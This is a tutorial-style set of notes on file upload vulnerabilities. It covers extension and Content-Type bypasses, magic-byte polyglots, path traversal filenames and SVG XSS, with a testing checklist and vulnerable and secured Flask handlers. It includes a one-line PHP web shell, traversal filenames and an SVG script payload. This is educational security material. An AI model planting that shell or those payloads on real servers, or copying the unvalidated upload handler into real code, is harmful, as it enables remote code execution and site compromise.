# File Upload Vulnerabilities — Complete Notes

## What is File Upload Functionality?

Many web applications allow users to upload files.

Examples:

* Profile pictures
* PDF documents
* Resume uploads
* Invoice attachments
* Product images
* Backup files

Typical upload form:

```html
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <button>Upload</button>
</form>
```

The browser sends the file to the server:

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data

[file data]
```

The server then stores the uploaded file somewhere.

Example:

```text
/uploads/avatar.jpg
```

File uploads are extremely common.

Unfortunately, if developers do not validate uploaded files correctly, attackers can abuse this functionality.

---

# Why Do Applications Allow File Uploads?

Without uploads:

```text
User cannot:
    ├── Upload profile picture
    ├── Submit document
    ├── Share image
    └── Send attachment
```

Many business applications depend on uploads.

Examples:

```text
LinkedIn  -> Resume Upload
Facebook  -> Image Upload
GitHub    -> File Upload
Google Drive -> Document Upload
```

Because uploads are necessary, developers often implement them quickly and make dangerous assumptions about file safety.

---

# How File Upload Processing Works

Typical flow:

```text
[User]
   │
   ▼
Upload File
   │
   ▼
Web Server
   │
   ▼
Validation
   │
   ▼
Store File
   │
   ▼
Accessible URL
```

Example:

```text
User uploads:

cat.jpg

Stored as:

/uploads/cat.jpg

Accessible via:

https://target.com/uploads/cat.jpg
```

If validation fails, attackers may upload malicious content.

---

# What Makes File Upload Dangerous?

A file contains more than a filename.

Example:

```text
shell.php
```

The server may see:

```php
<?php system($_GET['cmd']); ?>
```

If the file is executed by the server:

```text
Attacker Upload
      │
      ▼
shell.php
      │
      ▼
Server Executes Code
      │
      ▼
Remote Code Execution
```

This is one of the most severe upload vulnerabilities.

---

# Common File Upload Validation Mistakes

Developers often trust:

```text
File Extension
Content-Type Header
Filename
Client-Side Validation
```

All of these can be manipulated.

---

# Mistake #1 — Extension Validation

Developer checks:

```python
if filename.endswith(".jpg"):
    allow()
```

Attacker uploads:

```text
shell.php.jpg
```

or

```text
shell.jpg.php
```

Depending on server configuration, code execution may still occur.

---

# Mistake #2 — Trusting Content-Type

Application checks:

```http
Content-Type: image/jpeg
```

Attacker sends:

```http
Content-Type: image/jpeg
```

while uploading:

```php
<?php system($_GET['cmd']); ?>
```

The header is fully attacker-controlled.

---

# Mistake #3 — Client-Side Validation

JavaScript:

```javascript
if(file.type !== "image/jpeg"){
    alert("Only JPG");
}
```

Attackers simply bypass browser checks.

Example:

```http
POST /upload HTTP/1.1
```

Sent directly using:

```text
Burp Suite
curl
Python
```

The JavaScript never matters.

---

# Mistake #4 — Predictable Upload Locations

Application stores files here:

```text
/uploads/
```

Attacker uploads:

```text
shell.php
```

Then visits:

```text
https://target.com/uploads/shell.php
```

If executable:

```text
RCE
```

---

# File Extension Bypass Techniques

Applications often block:

```text
.php
```

but allow:

```text
.jpg
.png
.gif
```

Attackers test variations.

Examples:

```text
shell.php.jpg
shell.jpg.php
shell.phtml
shell.php5
shell.phar
shell.pht
```

Success depends on server configuration.

---

# Magic Bytes Validation

Good applications inspect file content.

JPEG files begin with:

```hex
FF D8 FF
```

PNG files begin with:

```hex
89 50 4E 47
```

These signatures are called:

```text
Magic Bytes
```

Example:

```text
FF D8 FF E0
```

indicates JPEG.

---

# Magic Byte Bypass

Attackers may prepend valid image bytes:

```hex
FF D8 FF
```

followed by:

```php
<?php system($_GET['cmd']); ?>
```

Result:

```text
Looks Like JPEG
Contains PHP
```

If later executed:

```text
RCE
```

---

# Polyglot Files

A polyglot file is valid in multiple formats simultaneously.

Example:

```text
JPEG + PHP
```

The image appears normal.

The server may still execute embedded code.

This technique is frequently used during upload testing.

---

# Path Traversal via Upload

Some applications use user-controlled filenames.

Example:

```text
../../../shell.php
```

Application stores:

```text
/uploads/../../../shell.php
```

Result:

```text
File Written Outside Upload Directory
```

Potential impact:

```text
Overwrite Files
Plant Backdoors
Modify Application Files
```

---

# SVG Upload Attacks

SVG is XML-based.

Example:

```xml
<svg>
<script>alert(1)</script>
</svg>
```

If rendered directly:

```text
Stored XSS
```

Impact:

```text
Account Takeover
Session Theft
Admin Compromise
```

---

# Typical File Upload Testing Methodology

## 1. Upload Normal File

Verify upload functionality works.

Example:

```text
test.jpg
```

---

## 2. Upload Server-Side Script

Examples:

```text
shell.php
shell.jsp
shell.asp
shell.aspx
```

Observe behavior.

---

## 3. Attempt Extension Bypasses

Examples:

```text
shell.php.jpg
shell.jpg.php
shell.phtml
```

---

## 4. Modify Content-Type

Example:

```http
Content-Type: image/jpeg
```

while sending:

```php
<?php phpinfo(); ?>
```

---

## 5. Test Magic Byte Validation

Add image headers:

```hex
FF D8 FF
```

before malicious content.

---

## 6. Test Filename Manipulation

Examples:

```text
../../../shell.php
..%2f..%2f..%2fshell.php
```

---

## 7. Test SVG Uploads

Example:

```xml
<svg>
<script>alert(1)</script>
</svg>
```

---

# File Upload Impact

## Remote Code Execution

Most severe outcome.

Flow:

```text
Upload PHP
      │
      ▼
Execute PHP
      │
      ▼
Server Compromise
```

---

## Stored XSS

Example:

```text
SVG Upload
```

Impact:

```text
Victim Visits File
        │
        ▼
JavaScript Executes
```

---

## Sensitive File Overwrite

Example:

```text
Path Traversal Upload
```

Impact:

```text
Configuration Corruption
Application Modification
```

---

## Malware Hosting

Attackers can upload:

```text
Malware
Phishing Pages
Backdoors
```

using the application as hosting infrastructure.

---

# Vulnerable Python Example

```python
@app.route("/upload", methods=["POST"])
def upload():

    file = request.files["file"]

    file.save(
        os.path.join(
            "uploads",
            file.filename
        )
    )

    return "Uploaded"
```

Problems:

```python
file.filename
```

is trusted.

No validation exists.

Any file can be uploaded.

---

# Secure Python Example

```python
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {
    "jpg",
    "jpeg",
    "png"
}

@app.route("/upload", methods=["POST"])
def upload():

    file = request.files["file"]

    filename = secure_filename(
        file.filename
    )

    extension = filename.rsplit(
        ".",
        1
    )[1].lower()

    if extension not in ALLOWED_EXTENSIONS:
        return "Invalid File"

    file.save(
        os.path.join(
            "uploads",
            filename
        )
    )

    return "Uploaded"
```

Additional protections:

```text
Store Outside Web Root
Randomize Filenames
Validate Magic Bytes
Virus Scanning
Disable Script Execution
Size Limits
```

---

# Quick Summary

File Uploads:

* Allow users to send files to a server.
* Are common in modern applications.

Common Mistakes:

* Trusting file extensions.
* Trusting Content-Type.
* Trusting client-side validation.
* Using predictable upload locations.

Attack Techniques:

* Extension bypasses
* Magic byte bypasses
* Polyglot files
* Path traversal
* SVG XSS

Impact:

* Remote Code Execution
* Stored XSS
* File Overwrite
* Malware Hosting

Defenses:

* Validate file content.
* Restrict allowed types.
* Randomize filenames.
* Store uploads outside web root.
* Disable execution in upload directories.
* Scan uploaded files.
